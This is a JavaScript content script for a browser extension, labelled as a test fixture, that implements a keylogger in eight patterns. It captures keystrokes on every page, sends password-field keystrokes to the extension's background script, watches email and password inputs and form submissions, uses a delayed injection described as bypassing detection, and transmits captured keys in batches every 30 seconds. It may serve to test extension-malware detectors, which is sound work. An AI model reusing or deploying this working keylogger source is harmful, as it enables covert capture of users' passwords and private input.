// TEST EXTENSION: Keylogging content script
// This script demonstrates various keylogging techniques for testing

console.log('TEST: Keylogger content script loaded on:', window.location.href);

// Storage for captured keystrokes
let capturedKeys = [];
let isCapturing = true;

// Pattern 1: addEventListener for keydown events
document.addEventListener('keydown', function(event) {
  if (!isCapturing) return;
  
  const keystrokeData = {
    type: 'keydown',
    key: event.key,
    code: event.code,
    keyCode: event.keyCode,
    target: event.target.tagName,
    targetType: event.target.type,
    targetName: event.target.name,
    targetId: event.target.id,
    url: window.location.href,
    timestamp: Date.now(),
    metaKey: event.metaKey,
    ctrlKey: event.ctrlKey,
    shiftKey: event.shiftKey,
    altKey: event.altKey
  };
  
  console.log('TEST: Keydown captured:', keystrokeData);
  capturedKeys.push(keystrokeData);
  
  // Send to background script
  chrome.runtime.sendMessage({
    type: 'keystroke',
    data: keystrokeData
  });
}, true);

// Pattern 2: addEventListener for keyup events
document.addEventListener('keyup', function(event) {
  if (!isCapturing) return;
  
  const keystrokeData = {
    type: 'keyup',
    key: event.key,
    code: event.code,
    keyCode: event.keyCode,
    target: event.target.tagName,
    targetType: event.target.type,
    url: window.location.href,
    timestamp: Date.now()
  };
  
  console.log('TEST: Keyup captured:', keystrokeData);
  capturedKeys.push(keystrokeData);
}, true);

// Pattern 3: addEventListener for keypress events
document.addEventListener('keypress', function(event) {
  if (!isCapturing) return;
  
  const keystrokeData = {
    type: 'keypress',
    key: event.key,
    charCode: event.charCode,
    target: event.target.tagName,
    url: window.location.href,
    timestamp: Date.now()
  };
  
  console.log('TEST: Keypress captured:', keystrokeData);
  capturedKeys.push(keystrokeData);
}, true);

// Pattern 4: Direct onkeydown assignment (older style)
function setupDirectKeyHandlers() {
  // Find form inputs and attach direct handlers
  const inputs = document.querySelectorAll('input, textarea');
  
  inputs.forEach((input, index) => {
    // Direct assignment pattern
    input.onkeydown = function(event) {
      if (!isCapturing) return;
      
      console.log(`TEST: Direct onkeydown on input ${index}:`, {
        key: event.key,
        value: this.value,
        name: this.name,
        type: this.type
      });
      
      // Special attention to password fields
      if (this.type === 'password') {
        console.log('TEST: Password field keystroke captured');
        
        chrome.runtime.sendMessage({
          type: 'keystroke',
          data: {
            type: 'password_keystroke',
            key: event.key,
            field: this.name || this.id,
            url: window.location.href,
            timestamp: Date.now()
          }
        });
      }
    };
    
    input.onkeyup = function(event) {
      if (!isCapturing) return;
      
      console.log(`TEST: Direct onkeyup on input ${index}:`, {
        key: event.key,
        currentValue: this.value
      });
    };
    
    input.onkeypress = function(event) {
      if (!isCapturing) return;
      
      console.log(`TEST: Direct onkeypress on input ${index}:`, {
        key: event.key,
        char: String.fromCharCode(event.charCode)
      });
    };
  });
}

// Pattern 5: Input value monitoring
function monitorInputValues() {
  const inputs = document.querySelectorAll('input[type="password"], input[type="email"], input[type="text"]');
  
  inputs.forEach(input => {
    let lastValue = input.value;
    
    // Monitor changes to input values
    const observer = new MutationObserver(() => {
      if (input.value !== lastValue) {
        console.log('TEST: Input value changed:', {
          field: input.name || input.id,
          type: input.type,
          oldLength: lastValue.length,
          newLength: input.value.length,
          url: window.location.href
        });
        
        lastValue = input.value;
        
        // Special logging for sensitive fields
        if (input.type === 'password' || input.type === 'email') {
          chrome.runtime.sendMessage({
            type: 'keystroke',
            data: {
              type: 'sensitive_input_change',
              fieldType: input.type,
              fieldName: input.name || input.id,
              valueLength: input.value.length,
              url: window.location.href,
              timestamp: Date.now()
            }
          });
        }
      }
    });
    
    observer.observe(input, { 
      attributes: true, 
      attributeFilter: ['value'],
      subtree: false 
    });
    
    // Also monitor via input event
    input.addEventListener('input', function() {
      console.log('TEST: Input event fired:', {
        type: this.type,
        name: this.name,
        valueLength: this.value.length
      });
    });
  });
}

// Pattern 6: Form submission monitoring
function monitorFormSubmissions() {
  document.addEventListener('submit', function(event) {
    console.log('TEST: Form submission detected');
    
    const form = event.target;
    const formData = new FormData(form);
    const submissionData = {
      action: form.action,
      method: form.method,
      url: window.location.href,
      timestamp: Date.now(),
      fields: {}
    };
    
    // Capture form data
    for (const [name, value] of formData.entries()) {
      submissionData.fields[name] = {
        type: typeof value,
        length: typeof value === 'string' ? value.length : 0
      };
      
      // Log sensitive field submissions
      const input = form.querySelector(`[name="${name}"]`);
      if (input && (input.type === 'password' || input.type === 'email')) {
        console.log('TEST: Sensitive form field submitted:', name);
      }
    }
    
    chrome.runtime.sendMessage({
      type: 'keystroke',
      data: {
        type: 'form_submission',
        ...submissionData
      }
    });
  }, true);
}

// Pattern 7: Global key combination detection
function detectKeyCombiinations() {
  document.addEventListener('keydown', function(event) {
    // Detect common key combinations
    if (event.ctrlKey || event.metaKey) {
      const combo = {
        ctrl: event.ctrlKey,
        meta: event.metaKey,
        shift: event.shiftKey,
        alt: event.altKey,
        key: event.key,
        url: window.location.href,
        timestamp: Date.now()
      };
      
      // Log potentially interesting combinations
      if (['c', 'v', 'x', 'a', 's', 'z', 'y'].includes(event.key.toLowerCase())) {
        console.log('TEST: Key combination detected:', combo);
        
        chrome.runtime.sendMessage({
          type: 'keystroke',
          data: {
            type: 'key_combination',
            ...combo
          }
        });
      }
    }
  });
}

// Pattern 8: Dynamic handler injection
function injectDynamicHandlers() {
  // Use setTimeout to bypass some detection
  setTimeout(() => {
    console.log('TEST: Injecting delayed keylogger handlers');
    
    // Create handlers programmatically
    const keyHandler = function(e) {
      console.log('TEST: Dynamic handler triggered:', e.type, e.key);
    };
    
    // Attach to document
    document.addEventListener('keydown', keyHandler);
    document.addEventListener('keyup', keyHandler);
    
    // Also attach to new elements as they're added
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        mutation.addedNodes.forEach((node) => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            if (node.tagName === 'INPUT' || node.tagName === 'TEXTAREA') {
              node.addEventListener('keydown', keyHandler);
              node.addEventListener('keyup', keyHandler);
              console.log('TEST: Added keylogger to new input element');
            }
          }
        });
      });
    });
    
    observer.observe(document.body, { childList: true, subtree: true });
  }, 2000);
}

// Initialize all keylogging patterns
function initializeKeylogger() {
  console.log('TEST: Initializing keylogger patterns');
  
  setupDirectKeyHandlers();
  monitorInputValues();
  monitorFormSubmissions();
  detectKeyCombiinations();
  injectDynamicHandlers();
  
  // Set up periodic data transmission
  setInterval(() => {
    if (capturedKeys.length > 0) {
      console.log('TEST: Transmitting', capturedKeys.length, 'captured keystrokes');
      
      // Simulate bulk transmission
      chrome.runtime.sendMessage({
        type: 'keystroke',
        data: {
          type: 'bulk_keystrokes',
          count: capturedKeys.length,
          keys: capturedKeys.splice(0, 50), // Send in batches
          url: window.location.href,
          timestamp: Date.now()
        }
      });
    }
  }, 30000); // Every 30 seconds
}

// Start keylogger when DOM is ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initializeKeylogger);
} else {
  initializeKeylogger();
}

// Also reinitialize on navigation
window.addEventListener('beforeunload', () => {
  console.log('TEST: Page unloading, finalizing keystroke collection');
  isCapturing = false;
});

// Re-enable on page show (back button, etc.)
window.addEventListener('pageshow', () => {
  console.log('TEST: Page shown, re-enabling keystroke capture');
  isCapturing = true;
});